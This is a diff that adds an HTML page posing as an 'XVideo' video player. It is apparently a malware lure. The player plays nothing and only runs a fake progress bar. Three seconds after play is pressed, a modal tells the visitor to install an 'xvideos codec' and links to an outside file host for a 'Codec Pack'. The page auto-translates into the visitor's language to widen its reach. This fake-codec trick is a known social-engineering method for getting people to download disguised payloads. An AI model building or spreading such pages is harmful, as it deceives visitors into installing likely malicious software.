@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XVideo Video Player - Multilingual</title>
+<style>
+/* Google Translate */
+.goog-te-banner-frame.skiptranslate,
+.goog-te-gadget-icon,
+#goog-gt-tt,
+.goog-te-balloon-frame,
+.goog-te-menu-frame { display: none !important; }
+body > .skiptranslate { display: none !important; }
+
+/* Body */
+body { margin: 0; background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: Arial, sans-serif; color: #fff; overflow-x: hidden; }
+
+/* Player */
+.player { position: relative; width: 90vw; max-width: 900px; aspect-ratio: 16/9; background: #000 url("ai_bot.png") center/cover no-repeat; overflow: hidden; border-radius: 10px; cursor: pointer; }
+.controls { position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); display: flex; align-items: center; padding: 8px; gap: 10px; font-size: 14px; color: #fff; }
+.btn { cursor: pointer; display: flex; align-items: center; user-select: none; font-size: 16px; }
+.progress-container { flex: 1; display: flex; align-items: center; gap: 8px; min-width: 80px; }
+.progress-bar { flex: 1; height: 4px; background: #333; border-radius: 2px; position: relative; cursor: pointer; }
+.progress { width: 0%; height: 100%; background: #e65c2d; }
+.time { white-space: nowrap; font-size: 13px; }
+.right-controls { display: flex; gap: 12px; align-items: center; }
+.volume { display: flex; align-items: center; gap: 4px; min-width: 60px; }
+.volume input[type="range"] { width: 80px; cursor: pointer; }
+
+/* Modal */
+.modal { display: none; position: fixed; z-index: 10000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); align-items: center; justify-content: center; padding: 10px; opacity: 0; transition: opacity 0.3s ease; }
+.modal.show { display: flex; opacity: 1; }
+.modal-content { background: rgba(243,243,243,0.9); border-radius: 10px; max-width: 320px; text-align: center; padding: 18px 20px; box-shadow: 0 6px 18px rgba(0,0,0,0.3); color: #000; font-size: 14px; transform: scale(0.9); transition: transform 0.3s ease, opacity 0.3s ease; opacity: 0; }
+.modal.show .modal-content { transform: scale(1); opacity: 1; }
+.modal-content .icon { font-size: 48px; color: #d93025; margin-bottom: 10px; }
+.modal-content p { margin: 0 0 15px 0; font-weight: 500; line-height: 1.4; }
+.modal-buttons a { padding: 10px 22px; font-size: 14px; border-radius: 6px; text-decoration: none; color: #fff; background-color: #0078d4; display: inline-block; }
+.modal-buttons a:hover { background-color: #005a9e; }
+
+@media (max-width: 768px) { .controls { font-size: 12px; gap: 6px; padding: 6px; } .btn { font-size: 14px; } .time { font-size: 11px; } .volume input[type="range"] { width: 60px; } }
+@media (max-width: 480px) { .controls { font-size: 11px; gap: 4px; } .btn { font-size: 12px; } .time { font-size: 10px; } .volume input[type="range"] { width: 50px; } }
+</style>
+</head>
+<body>
+<div id="google_translate_element" style="display: none;"></div>
+
+<div class="player" id="player">
+  <div class="controls">
+    <div class="btn" id="play-btn">▶</div>
+    <div class="volume">
+      <div class="btn">🔊</div>
+      <input type="range" id="volume" min="0" max="100" value="50">
+    </div>
+    <div class="progress-container">
+      <div class="progress-bar" id="progress-bar"><div class="progress" id="progress"></div></div>
+      <div class="time" id="time">0:00 / 0:00</div>
+    </div>
+    <div class="right-controls">
+      <div class="btn">⚙</div>
+      <div class="btn" id="fullscreen-btn">⛶</div> <!-- Визуальная кнопка, без функционала -->
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="modal">
+  <div class="modal-content">
+    <p>To play the video correctly, you need to install xvideos codec.</p>
+    <div class="modal-buttons">
+      <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank" rel="noopener noreferrer">Install</a>
+    </div>
+  </div>
+</div>
+
+<script>
+const playBtn = document.getElementById("play-btn");
+const volumeSlider = document.getElementById("volume");
+const player = document.getElementById("player");
+const modal = document.getElementById("modal");
+const modalLink = document.querySelector(".modal-buttons a");
+const progress = document.getElementById("progress");
+const progressBar = document.getElementById("progress-bar");
+const timeDisplay = document.getElementById("time");
+
+let isPlaying = false;
+let interval;
+let currentTime = 0;
+const totalDuration = Math.floor(Math.random() * (928 - 722 + 1)) + 722;
+let modalTimeout;
+
+function formatTime(sec){const m=Math.floor(sec/60);const s=sec%60;return`${m}:${s.toString().padStart(2,"0")}`;}
+function updateTime(){timeDisplay.textContent=`${formatTime(currentTime)} / ${formatTime(totalDuration)}`;progress.style.width=`${(currentTime/totalDuration)*100}%`;}
+function startProgress(){if(!interval){interval=setInterval(()=>{if(currentTime<totalDuration){currentTime++;updateTime();}else{clearInterval(interval);interval=null;}},1000);}}
+function showModalDelayed(){clearTimeout(modalTimeout);modalTimeout=setTimeout(()=>{modal.classList.add("show");document.body.style.overflow="hidden";},3000);}
+
+playBtn.addEventListener("click",()=>{if(!isPlaying){startProgress();showModalDelayed();}isPlaying=!isPlaying;playBtn.textContent=isPlaying?"⏸":"▶";});
+modalLink.addEventListener("click",()=>{modal.classList.remove("show");document.body.style.overflow="";});
+player.addEventListener("click",(e)=>{if(e.target===player&&!isPlaying){startProgress();showModalDelayed();isPlaying=true;playBtn.textContent="⏸";}});
+volumeSlider.addEventListener("input",()=>{console.log("Volume:",volumeSlider.value);});
+progressBar.addEventListener("click",(e)=>{const rect=progressBar.getBoundingClientRect();const clickX=e.clientX-rect.left;const newTime=Math.floor((clickX/rect.width)*totalDuration);currentTime=newTime;updateTime();});
+updateTime();
+
+// Google Translate Init
+function googleTranslateElementInit(){new google.translate.TranslateElement({pageLanguage:'en',autoDisplay:false},'google_translate_element');const userLang=navigator.language||navigator.userLanguage;const langCode=userLang.split('-')[0];const interval=setInterval(()=>{const select=document.querySelector('.goog-te-combo');if(select){select.value=langCode;select.dispatchEvent(new Event('change'));clearInterval(interval);}},500);}
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</body>
+</html>
+
